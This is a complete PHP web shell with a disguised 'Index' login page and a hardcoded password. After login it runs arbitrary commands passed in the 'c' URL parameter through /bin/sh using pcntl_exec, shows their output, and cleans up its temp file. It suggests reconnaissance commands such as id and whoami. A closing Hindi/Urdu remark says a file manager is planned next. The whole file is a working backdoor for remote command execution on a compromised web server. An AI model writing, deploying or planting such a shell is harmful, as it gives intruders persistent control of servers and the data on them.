<?php
error_reporting(0);
session_start();

$password = "wiredmouseis";   

// Reset + Login Check
if (isset($_GET['reset'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['key']) && $_POST['key'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // Login Page
    die('
    <!DOCTYPE html>
    <html>
    <head><title>Index</title>
    <style>
        body{background:#f8f9fa;color:#222;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .box{background:white;padding:50px;border:1px solid #ddd;border-radius:10px;box-shadow:0 5px 20px rgba(0,0,0,0.1);text-align:center;}
        input{width:280px;padding:15px;font-size:17px;border:1px solid #888;border-radius:5px;}
        button{padding:14px 40px;background:#0066ff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;margin-top:10px;}
    </style>
    </head>
    <body>
        <div class="box">
            <h2>Access Panel</h2>
            <form method="post">
                <input type="password" name="key" placeholder="Enter Password" autofocus><br><br>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>');
}

// ====================== PANEL ======================
echo "<h2>Panel Loaded Successfully</h2>";
echo "<a href='?reset=1' style='color:red;'>Logout & Reset</a><br><br>";

// Command Test
$cmd = $_GET['c'] ?? '';
if($cmd){
    echo "<pre style='background:#000;color:lime;padding:15px;'>";
    echo "Command: $cmd\n\n";
    $out = '/tmp/o'.rand(1000,9999).'.txt';
    if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
        $pid = pcntl_fork();
        if($pid == 0){
            pcntl_exec('/bin/sh', ['-c', $cmd." > $out 2>&1"]);
            exit();
        }
        sleep(2);
    }
    $res = file_exists($out) ? file_get_contents($out) : '';
    @unlink($out);
    echo htmlspecialchars($res ?: "No output");
    echo "</pre>";
}
?>

<form>
    <input type="text" name="c" placeholder="id or whoami or ls -la" style="padding:10px;width:70%;">
    <button type="submit">Run</button>
</form>

<p><b>File Manager abhi add nahi kiya hai. Pehle confirm karo login + cmd chal raha hai ya nahi.</b></p>
